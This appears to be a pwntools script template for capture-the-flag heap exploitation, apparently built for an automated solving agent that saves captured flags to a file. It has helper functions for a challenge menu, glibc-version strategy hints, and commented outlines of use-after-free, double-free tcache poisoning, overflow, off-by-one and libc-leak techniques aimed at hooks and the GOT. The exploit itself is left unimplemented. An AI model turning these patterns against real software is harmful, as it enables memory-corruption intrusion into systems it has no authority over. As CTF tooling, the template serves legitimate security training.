#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
LIBC = os.getenv("LIBC", "./libc.so.6")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None
context.log_level = os.getenv("LOG", "info")

# Heap operation menu - customize these for the target
ALLOC = os.getenv("ALLOC", "1")      # Menu option to allocate
FREE = os.getenv("FREE", "2")        # Menu option to free
EDIT = os.getenv("EDIT", "3")        # Menu option to edit
SHOW = os.getenv("SHOW", "4")        # Menu option to show/print
SIZE_IDX = int(os.getenv("SIZE_IDX", "0"))  # Index for size input

def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


def alloc(io, size, data=b"A"):
    io.sendlineafter(b"> ", ALLOC.encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendlineafter(b"data: ", data if isinstance(data, bytes) else data.encode())


def free(io, idx):
    io.sendlineafter(b"> ", FREE.encode())
    io.sendlineafter(b"index: ", str(idx).encode())


def edit(io, idx, data):
    io.sendlineafter(b"> ", EDIT.encode())
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"data: ", data if isinstance(data, bytes) else data.encode())


def show(io, idx):
    io.sendlineafter(b"> ", SHOW.encode())
    io.sendlineafter(b"index: ", str(idx).encode())
    return io.recvuntil(b"\n> ", timeout=2)


# Detect glibc version for heap exploitation strategy
if libc:
    glibc_ver = libc.libc_version if hasattr(libc, 'libc_version') else None
    if glibc_ver:
        log.info(f"Detected glibc version: {glibc_ver}")
        major, minor = map(int, glibc_ver.split('.')[:2])
        
        # Strategy hints based on version
        if major == 2 and minor < 26:
            log.info("Old glibc: tcache not present, try fastbin attack")
        elif major == 2 and minor < 29:
            log.info("Glibc 2.26-2.28: tcache without key, try tcache poisoning")
        elif major == 2 and minor < 32:
            log.info("Glibc 2.29-2.31: tcache with key, need UAF or safe-link bypass")
        else:
            log.info("Glibc 2.32+: modern protections, need advanced techniques")
    else:
        log.info("Could not detect glibc version - using generic heap strategy")

# === HEAP EXPLOIT SKELETON ===
# Common patterns to try:
#
# 1. UAF (Use After Free):
#    alloc(0, 0x20)
#    free(0)
#    show(0)  # Leak from freed chunk
#    edit(0, p64(target))  # Overwrite fd pointer
#
# 2. Double Free:
#    alloc(0, 0x20)
#    alloc(1, 0x20)  # Prevent consolidation
#    free(0)
#    free(1)
#    free(0)  # Double free
#    alloc(2, 0x20, p64(target))  # Poison tcache
#
# 3. Heap Overflow -> Overlap:
#    alloc(0, 0x18)
#    alloc(1, 0x60)
#    alloc(2, 0x20)  # Prevent consolidation
#    edit(0, b"A"*0x18 + p64(0x91))  # Overwrite size
#    free(1)  # Free overlapping chunk
#
# 4. Off-by-One / Null Byte Poison:
#    alloc(0, 0x18)
#    alloc(1, 0x68)
#    alloc(2, 0x10)
#    edit(0, b"A"*0x18 + b"\x00")  # Null byte overflow
#    free(1)
#
# 5. Unsorted Bin Leak:
#    alloc(0, 0x410)  # Larger than tcache
#    alloc(1, 0x20)   # Prevent consolidation with top
#    free(0)           # Goes to unsorted bin
#    show(0)           # Leak main_arena pointer

# TODO: Implement the specific heap exploit for this challenge
# Steps:
# 1. Identify the heap primitive (UAF, overflow, double-free, etc.)
# 2. Leak heap/libc if needed
# 3. Overwrite target (GOT, __free_hook, __malloc_hook, etc.)
# 4. Get shell or read flag

if __name__ == "__main__":
    log.info("Heap helper template loaded. Do not run blindly; fill alloc/free/edit/show prompts first.")
    log.info("First prove exactly one primitive: UAF, double-free, overflow, off-by-one, or stale show.")
    log.info("Common closure targets: __free_hook, __malloc_hook, stderr, __exit_funcs, GOT, vtable, or data-only output path.")
    raise SystemExit("TODO: implement the challenge-specific heap transaction sequence")
